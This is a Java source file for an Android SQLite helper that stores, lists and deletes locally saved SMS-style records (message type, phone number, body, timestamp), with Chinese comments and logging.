package android.app.sms.sqlite;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;
import android.annotation.SuppressLint;
import android.app.sms.entity.SMSInfo;
import android.app.sms.utils.LogUtils;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class DQLiteOpenHelper extends SQLiteOpenHelper {

	private SQLiteDatabase Tdb;
	
	private static String name="mydata";
	
	private static DQLiteOpenHelper helper;
	
	private AtomicInteger mOpenCounter = new AtomicInteger();
	
	@SuppressLint("SimpleDateFormat")
	private static SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd/HH:mm:ss");
	
	public DQLiteOpenHelper(Context context) {
		super(context, name, null, 10);
	}
	
	public static DQLiteOpenHelper getHelper(Context context) {
		if(helper == null){
			helper = new DQLiteOpenHelper(context);
		}
		return helper;
	}

	@Override
	public void onCreate(SQLiteDatabase sqLiteDatabase) {
		String sql="create table data(id INTEGER PRIMARY KEY AUTOINCREMENT,type varchar(40),pn varchar(20),body varchar(1000),time varchar(20))";
		sqLiteDatabase.execSQL(sql);
	}

	@Override
	public void onUpgrade(SQLiteDatabase sqLiteDatabase, int i, int b) {
		sqLiteDatabase.execSQL("drop table if exists data");  
		this.onCreate(sqLiteDatabase);
	}
	
	/**
	 * 插入本地数据库
	 * @param type
	 * @param pn
	 * @param body
	 * @param date
	 */
	public synchronized void addData(String type, String pn, String body, Date date) {
		LogUtils.write("Send", "插入本地数据库:type=" + type + ",pn=" + pn + ",body=" + body);
		String sql="insert into data(type,pn,body,time) values(?,?,?,?)";
		String time=format.format(date);
		this.openDatabase();
		this.Tdb.execSQL(sql, new Object[]{type,pn,body,time});
		this.closeDatabase();
	}
	
	public synchronized List<SMSInfo> getData() {
		this.openDatabase();
		List<SMSInfo> smsInfos = null;
		String sql="select * from data";
		Cursor c = this.Tdb.rawQuery(sql, null);
		if(c.getCount() != 0) {
			smsInfos = new ArrayList<SMSInfo>();
			for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
				int id = c.getInt(c.getColumnIndex("id"));
				String pn = c.getString(c.getColumnIndex("pn"));
				String type = c.getString(c.getColumnIndex("type"));
				String body = c.getString(c.getColumnIndex("body"));
				String time = c.getString(c.getColumnIndex("time"));
				smsInfos.add(new SMSInfo(id, pn, type, body, time));
			}
		}
		return smsInfos;
	}
	
	/**
	 * 删除本地数据
	 * @param id
	 */
	public synchronized void deleteData(String id){
		LogUtils.write("Send", "删除本地数据:id=" + id);
		String sql="delete from data where id=?";
		this.openDatabase();
		this.Tdb.execSQL(sql, new Object[]{id});
		this.closeDatabase();
	}
	
	private synchronized SQLiteDatabase openDatabase() {  
        if(this.mOpenCounter.incrementAndGet() == 1) {  
        	this.Tdb = this.getWritableDatabase();  
        }
        return this.Tdb;  
    }  
  
	private synchronized void closeDatabase() {  
        if(this.mOpenCounter.decrementAndGet() == 0) {  
        	this.Tdb.close();  
        }
    }
}
